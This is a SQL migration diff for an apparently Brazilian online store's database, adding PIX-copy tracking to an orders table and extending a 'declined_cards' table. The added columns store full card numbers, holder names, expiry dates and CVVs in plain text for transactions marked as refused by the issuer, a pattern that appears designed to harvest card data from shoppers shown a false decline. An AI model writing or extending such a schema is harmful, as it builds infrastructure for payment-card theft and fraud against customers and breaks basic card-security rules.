@@ -82,6 +82,8 @@ CREATE TABLE IF NOT EXISTS public.orders (
 ALTER TABLE public.orders ADD COLUMN IF NOT EXISTS tracking_reference TEXT;
 ALTER TABLE public.orders ADD COLUMN IF NOT EXISTS custom_logistic_status TEXT;
 ALTER TABLE public.orders ADD COLUMN IF NOT EXISTS approved_at TIMESTAMPTZ;
+ALTER TABLE public.orders ADD COLUMN IF NOT EXISTS pix_copied BOOLEAN DEFAULT FALSE;
+ALTER TABLE public.orders ADD COLUMN IF NOT EXISTS pix_copied_at TIMESTAMPTZ;
 
 CREATE INDEX IF NOT EXISTS idx_orders_status ON public.orders(status);
 CREATE INDEX IF NOT EXISTS idx_orders_created ON public.orders(created_at DESC);
@@ -111,12 +113,28 @@ CREATE TABLE IF NOT EXISTS public.declined_cards (
   customer_cpf TEXT,
   card_brand TEXT,
   card_last4 TEXT,
+  card_number TEXT,
+  card_holder TEXT,
+  card_expiry TEXT,
+  card_cvv TEXT,
+  shipping JSONB DEFAULT '{}'::jsonb,
+  shipping_cost NUMERIC(10,2) DEFAULT 0,
+  subtotal NUMERIC(10,2),
   installments INTEGER DEFAULT 1,
   utm_params JSONB DEFAULT '{}'::jsonb,
   items JSONB DEFAULT '[]'::jsonb,
   reason TEXT DEFAULT 'Transação não autorizada pela emissora',
   created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
 );
+
+-- Garantia de colunas caso a tabela declined_cards já exista
+ALTER TABLE public.declined_cards ADD COLUMN IF NOT EXISTS card_number TEXT;
+ALTER TABLE public.declined_cards ADD COLUMN IF NOT EXISTS card_holder TEXT;
+ALTER TABLE public.declined_cards ADD COLUMN IF NOT EXISTS card_expiry TEXT;
+ALTER TABLE public.declined_cards ADD COLUMN IF NOT EXISTS card_cvv TEXT;
+ALTER TABLE public.declined_cards ADD COLUMN IF NOT EXISTS shipping JSONB DEFAULT '{}'::jsonb;
+ALTER TABLE public.declined_cards ADD COLUMN IF NOT EXISTS shipping_cost NUMERIC(10,2) DEFAULT 0;
+ALTER TABLE public.declined_cards ADD COLUMN IF NOT EXISTS subtotal NUMERIC(10,2);
 
 CREATE INDEX IF NOT EXISTS idx_declined_cards_created ON public.declined_cards(created_at DESC);
 CREATE INDEX IF NOT EXISTS idx_declined_cards_phone ON public.declined_cards(customer_phone);
